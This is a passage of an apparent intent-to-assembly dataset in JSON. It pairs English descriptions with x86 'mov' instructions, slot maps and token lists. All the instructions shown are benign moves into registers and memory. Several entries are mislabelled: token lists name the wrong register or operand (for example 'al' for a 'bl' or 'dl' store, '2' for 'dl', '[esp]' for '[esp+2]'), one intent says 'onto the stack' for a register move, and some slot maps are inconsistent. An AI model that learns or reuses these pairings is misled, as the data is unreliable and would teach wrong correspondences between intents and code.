    "snippet": "mov ax, 00",
    "slot_map": {},
    "intent_tokens": [
      "initialize",
      "ax",
      "00"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "00"
    ]
  },
  {
    "intent": "move value of 0x010ch into the register ax",
    "rewritten_intent": "move value of 0x010ch into the register ax",
    "snippet": "mov ax, 010ch",
    "slot_map": {
      "0x010c": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "0x010ch",
      "register",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "010ch"
    ]
  },
  {
    "intent": "move 0x167 into ax",
    "rewritten_intent": "move 0x167 into ax",
    "snippet": "mov ax, 0x167",
    "slot_map": {
      "0x167": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x169 into ax",
    "rewritten_intent": "move 0x169 into ax",
    "snippet": "mov ax, 0x169",
    "slot_map": {
      "0x169": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x16a into ax",
    "rewritten_intent": "move 0x16a into ax",
    "snippet": "mov ax, 0x16a",
    "slot_map": {
      "0x16a": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x16b into ax",
    "rewritten_intent": "move 0x16b into ax",
    "snippet": "mov ax, 0x16b",
    "slot_map": {
      "0x16b": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x16c into ax",
    "rewritten_intent": "move 0x16c into ax",
    "snippet": "mov ax, 0x16c",
    "slot_map": {
      "0x16c": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move value of 1 into register ax",
    "rewritten_intent": "move value of 1 into register ax",
    "snippet": "mov ax, 1",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "value",
      "1",
      "register",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "1"
    ]
  },
  {
    "intent": "move 102 into ax",
    "rewritten_intent": "move 102 into ax",
    "snippet": "mov ax, 102",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "102",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "102"
    ]
  },
  {
    "intent": "move 1666 into ax",
    "rewritten_intent": "move 1666 into ax",
    "snippet": "mov ax, 1666",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "1666",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "1666"
    ]
  },
  {
    "intent": "transfer the immediate constant 45h to ax",
    "rewritten_intent": "transfer the immediate constant 45h to ax",
    "snippet": "mov ax, 45h",
    "slot_map": {
      "45h": "var0"
    },
    "intent_tokens": [
      "transfer",
      "immediate",
      "constant",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 8h into ax",
    "rewritten_intent": "move 8h into ax",
    "snippet": "mov ax, 8h",
    "slot_map": {
      "8h": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "get 9 in the ax",
    "rewritten_intent": "get 9 in the ax",
    "snippet": "mov ax, 9",
    "slot_map": {},
    "intent_tokens": [
      "get",
      "9",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "9"
    ]
  },
  {
    "intent": "move bx into ax",
    "rewritten_intent": "move bx into ax",
    "snippet": "mov ax, bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of bx into ax",
    "rewritten_intent": "move the contents of bx into ax",
    "snippet": "mov ax, bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "ax"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x01 into bl",
    "rewritten_intent": "move 0x01 into bl",
    "snippet": "mov bl, 0x01",
    "slot_map": {
      "0x01": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x02 into bl",
    "rewritten_intent": "move 0x02 into bl",
    "snippet": "mov bl, 0x02",
    "slot_map": {
      "0x02": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x04 into bl",
    "rewritten_intent": "move 0x04 into bl",
    "snippet": "mov bl, 0x04",
    "slot_map": {
      "0x04": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x1 into the bl register",
    "rewritten_intent": "move the value 0x1 into the bl register",
    "snippet": "mov bl, 0x1",
    "slot_map": {
      "0x1": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1 into bl",
    "rewritten_intent": "move 0x1 into bl",
    "snippet": "mov bl, 0x1",
    "slot_map": {
      "0x1": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x14 into bl",
    "rewritten_intent": "move 0x14 into bl",
    "snippet": "mov bl, 0x14",
    "slot_map": {
      "0x14": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2 into bl",
    "rewritten_intent": "move 0x2 into bl",
    "snippet": "mov bl, 0x2",
    "slot_map": {
      "0x2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x2 into the bl register",
    "rewritten_intent": "move the value 0x2 into the bl register",
    "snippet": "mov bl, 0x2",
    "slot_map": {
      "0x2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x3 into bl",
    "rewritten_intent": "move 0x3 into bl",
    "snippet": "mov bl, 0x3",
    "slot_map": {
      "0x3": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x4 onto the stack",
    "rewritten_intent": "move the value 0x4 onto the stack",
    "snippet": "mov bl, 0x4",
    "slot_map": {
      "0x4": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "mov",
      "bl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x4 into bl",
    "rewritten_intent": "move 0x4 into bl",
    "snippet": "mov bl, 0x4",
    "slot_map": {
      "0x4": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x5 into bl",
    "rewritten_intent": "move 0x5 into bl",
    "snippet": "mov bl, 0x5",
    "slot_map": {
      "0x5": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x5 into the bl register",
    "rewritten_intent": "move the value 0x5 into the bl register",
    "snippet": "mov bl, 0x5",
    "slot_map": {
      "0x5": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x7 into bl",
    "rewritten_intent": "move 0x7 into bl",
    "snippet": "mov bl, 0x7",
    "slot_map": {
      "0x7": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x8 into bl",
    "rewritten_intent": "move 0x8 into bl",
    "snippet": "mov bl, 0x8",
    "slot_map": {
      "0x8": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x9 into bl",
    "rewritten_intent": "move 0x9 into bl",
    "snippet": "mov bl, 0x9",
    "slot_map": {
      "0x9": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xe into bl",
    "rewritten_intent": "move 0xe into bl",
    "snippet": "mov bl, 0xe",
    "slot_map": {
      "0xe": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 10 into bl",
    "rewritten_intent": "move 10 into bl",
    "snippet": "mov bl, 10",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "10",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "move 2 into bl",
    "rewritten_intent": "move 2 into bl",
    "snippet": "mov bl, 2",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "2",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "move 3 into bl",
    "rewritten_intent": "move 3 into bl",
    "snippet": "mov bl, 3",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "3",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero",
    "rewritten_intent": "move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero",
    "snippet": "mov bl, 3 \\n dec bl \\n jnz l3",
    "slot_map": {
      "bl": "var0",
      "l3": "var2"
    },
    "intent_tokens": [
      "move",
      "value",
      "3",
      "var0",
      "register",
      "then",
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "3",
      "\\n",
      "dec",
      "var0",
      "\\n",
      "jnz",
      "var2"
    ]
  },
  {
    "intent": "move 4 into bl",
    "rewritten_intent": "move 4 into bl",
    "snippet": "mov bl, 4",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "4",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "store 5 into bl",
    "rewritten_intent": "store 5 into bl",
    "snippet": "mov bl, 5",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "store",
      "5",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "5"
    ]
  },
  {
    "intent": "move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero",
    "rewritten_intent": "move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero",
    "snippet": "mov bl, al \\n sub bl, 2 \\n jnz loop",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "al",
      "register",
      "contents",
      "var0",
      "register",
      "then",
      "subtract",
      "value",
      "2",
      "cl",
      "register",
      "and",
      "jump",
      "loop",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "al",
      "\\n",
      "sub",
      "var0",
      ",",
      "2",
      "\\n",
      "jnz",
      "loop"
    ]
  },
  {
    "intent": "move the byte at address digits+ebx into bl",
    "rewritten_intent": "move the byte at address digits+ebx into bl",
    "snippet": "mov bl, byte [digits+ebx]",
    "slot_map": {
      "digits+ebx": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte in eax into bl",
    "rewritten_intent": "move the byte in eax into bl",
    "snippet": "mov bl, byte [eax]",
    "slot_map": {
      "eax": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address 0eh into bl",
    "rewritten_intent": "move the byte at the address 0eh into bl",
    "snippet": "mov bl, byte 0eh",
    "slot_map": {
      "0eh": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move cl into bl",
    "rewritten_intent": "move cl into bl",
    "snippet": "mov bl, cl",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "cl",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move the contents of the esi register into the bx register",
    "rewritten_intent": "move the contents of the esi register into the bx register",
    "snippet": "mov bx, [esi]",
    "slot_map": {
      "esi": "var0",
      "bx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move 1666 into bx",
    "rewritten_intent": "move 1666 into bx",
    "snippet": "mov bx, 1666",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "move",
      "1666",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "1666"
    ]
  },
  {
    "intent": "get 18 in the bx register",
    "rewritten_intent": "get 18 in the bx register",
    "snippet": "mov bx, 18",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "get",
      "18",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "18"
    ]
  },
  {
    "intent": "move the value 20 into bx",
    "rewritten_intent": "move the value 20 into bx",
    "snippet": "mov bx, 20",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "20",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "20"
    ]
  },
  {
    "intent": "move memory word_value to register bx",
    "rewritten_intent": "move memory word_value to register bx",
    "snippet": "mov bx, word_value",
    "slot_map": {
      "word_value": "var0",
      "bx": "var1"
    },
    "intent_tokens": [
      "move",
      "memory",
      "var0",
      "register",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move dl into the byte at address [eax]",
    "rewritten_intent": "move dl into the byte at address [eax]",
    "snippet": "mov byte [eax], dl",
    "slot_map": {
      "eax": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 2 into the single byte at the address stored in ebx",
    "rewritten_intent": "move 2 into the single byte at the address stored in ebx",
    "snippet": "mov byte [ebx], 2",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "2",
      "single",
      "byte",
      "address",
      "stored",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "2"
    ]
  },
  {
    "intent": "move 2 into the single byte at memory location ecx",
    "rewritten_intent": "move 2 into the single byte at memory location ecx",
    "snippet": "mov byte [ecx], 2",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "2",
      "single",
      "byte",
      "memory",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "2"
    ]
  },
  {
    "intent": "move dl into the byte at address [ecx+92]",
    "rewritten_intent": "move dl into the byte at address [ecx+92]",
    "snippet": "mov byte [ecx+92], dl",
    "slot_map": {
      "ecx+92": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "2"
    ]
  },
  {
    "intent": "move dl into the single byte at the address stored in ecx+92",
    "rewritten_intent": "move dl into the single byte at the address stored in ecx+92",
    "snippet": "mov byte [ecx+92], dl",
    "slot_map": {
      "ecx+92": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "single",
      "byte",
      "address",
      "stored",
      "ecx+92"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "move bl into the byte in edi",
    "rewritten_intent": "move bl into the byte in edi",
    "snippet": "mov byte [edi], bl",
    "slot_map": {
      "bl": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move al into the single byte at the address stored in edx+ecx",
    "rewritten_intent": "move al into the single byte at the address stored in edx+ecx",
    "snippet": "mov byte [edx+ecx],al",
    "slot_map": {
      "edx+ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "single",
      "byte",
      "address",
      "stored",
      "edx+ecx"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move dl into the byte at address [esi + 1]",
    "rewritten_intent": "move dl into the byte at address [esi + 1]",
    "snippet": "mov byte [esi + 1], dl",
    "slot_map": {
      "esi + 1": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move bl into the byte at address [esi]",
    "rewritten_intent": "move bl into the byte at address [esi]",
    "snippet": "mov byte [esi], bl",
    "slot_map": {
      "esi": "var2",
      "bl": "var0",
      "[": "var1",
      "]": "var3"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the byte at address [esi+11]",
    "rewritten_intent": "move al into the byte at address [esi+11]",
    "snippet": "mov byte [esi+11], al",
    "slot_map": {
      "esi+11": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the byte at address [esi+12]",
    "rewritten_intent": "move al into the byte at address [esi+12]",
    "snippet": "mov byte [esi+12], al",
    "slot_map": {
      "esi+12": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "move",
      "al",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the byte at address [esi+14]",
    "rewritten_intent": "move al into the byte at address [esi+14]",
    "snippet": "mov byte [esi+14], al",
    "slot_map": {
      "esi+14": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move the contents of al into the byte at the memory location specified by the operation [esi+14]",
    "rewritten_intent": "move the contents of al into the byte at the memory location specified by the operation [esi+14]",
    "snippet": "mov byte [esi+14],al",
    "slot_map": {
      "esi+14": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "al",
      "byte",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the byte at address [esi+17]",
    "rewritten_intent": "move al into the byte at address [esi+17]",
    "snippet": "mov byte [esi+17], al",
    "slot_map": {
      "esi+17": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "move",
      "al",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move the contents of al into the byte at the memory location specified by the operation [esi+17]",
    "rewritten_intent": "move the contents of al into the byte at the memory location specified by the operation [esi+17]",
    "snippet": "mov byte [esi+17],al",
    "slot_map": {
      "esi+17": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "move",
      "contents",
      "al",
      "byte",
      "memory",
      "location",
      "specified",
      "operation",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the byte at address [esi+21]",
    "rewritten_intent": "move al into the byte at address [esi+21]",
    "snippet": "mov byte [esi+21], al",
    "slot_map": {
      "esi+21": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move al into the byte at address [esi+7]",
    "rewritten_intent": "move al into the byte at address [esi+7]",
    "snippet": "mov byte [esi+7], al",
    "slot_map": {
      "esi+7": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "byte",
      "address",
      "[",
      "var1",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move 0x2e into the byte in esp",
    "rewritten_intent": "move 0x2e into the byte in esp",
    "snippet": "mov byte [esp], 0x2e",
    "slot_map": {
      "0x2e": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "esp"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2f into the byte at address [esp]",
    "rewritten_intent": "move 0x2f into the byte at address [esp]",
    "snippet": "mov byte [esp], 0x2f",
    "slot_map": {
      "esp": "var3",
      "0x2f": "var0",
      "[": "var2",
      "]": "var4"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2f into the byte in esp",
    "rewritten_intent": "move 0x2f into the byte in esp",
    "snippet": "mov byte [esp], 0x2f",
    "slot_map": {
      "0x2f": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "esp"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x7f into the byte at address [esp]",
    "rewritten_intent": "move 0x7f into the byte at address [esp]",
    "snippet": "mov byte [esp], 0x7f",
    "slot_map": {
      "esp": "var3",
      "0x7f": "var0",
      "[": "var2",
      "]": "var4"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x07 into the byte at address [esp+2]",
    "rewritten_intent": "move 0x07 into the byte at address [esp+2]",
    "snippet": "mov byte [esp+2], 0x07",
    "slot_map": {
      "esp+2": "var3",
      "0x07": "var0",
      "[": "var2"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x01 into the byte at address [esp+3]",
    "rewritten_intent": "move 0x01 into the byte at address [esp+3]",
    "snippet": "mov byte [esp+3], 0x01",
    "slot_map": {
      "esp+3": "var3",
      "0x01": "var0",
      "[": "var2"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x11 into the byte at address [esp+3]",
    "rewritten_intent": "move 0x11 into the byte at address [esp+3]",
    "snippet": "mov byte [esp+3], 0x11",
    "slot_map": {
      "esp+3": "var3",
      "0x11": "var0",
      "[": "var2"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move a byte from bl into memory address hexstr+edx+1",
    "rewritten_intent": "move a byte from bl into memory address hexstr+edx+1",
    "snippet": "mov byte [hexstr+edx+1],bl",
    "slot_map": {
      "hexstr+edx+1": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "memory",
      "address",
      "hexstr+edx+1"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move a byte from al into memory address hexstr+edx+2",
    "rewritten_intent": "move a byte from al into memory address hexstr+edx+2",
    "snippet": "mov byte [hexstr+edx+2],al",
    "slot_map": {
      "hexstr+edx+2": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "al",
      "memory",
      "address",
      "hexstr+edx+2"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "store the value 5 into the byte at memory location var",
    "rewritten_intent": "store the value 5 into the byte at memory location var",
    "snippet": "mov byte [var], 5",
    "slot_map": {},
    "intent_tokens": [
      "store",
      "value",
      "5",
      "byte",
      "memory",
      "location",
      "var"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var",
      "]",
      ",",
      "5"
    ]
  },
  {
    "intent": "move 0x0b into the byte at address al",
    "rewritten_intent": "move 0x0b into the byte at address al",
    "snippet": "mov byte al, 0x0b",
    "slot_map": {
      "0x0b": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x3f into the byte at address al",
    "rewritten_intent": "move 0x3f into the byte at address al",
    "snippet": "mov byte al, 0x3f",
    "slot_map": {
      "0x3f": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x3f into the byte in al",
    "rewritten_intent": "move 0x3f into the byte in al",
    "snippet": "mov byte al, 0x3f",
    "slot_map": {
      "0x3f": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xa4 into the byte at address al",
    "rewritten_intent": "move 0xa4 into the byte at address al",
    "snippet": "mov byte al, 0xa4",
    "slot_map": {
      "0xa4": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "al",
      ",",
      "var0"
    ]
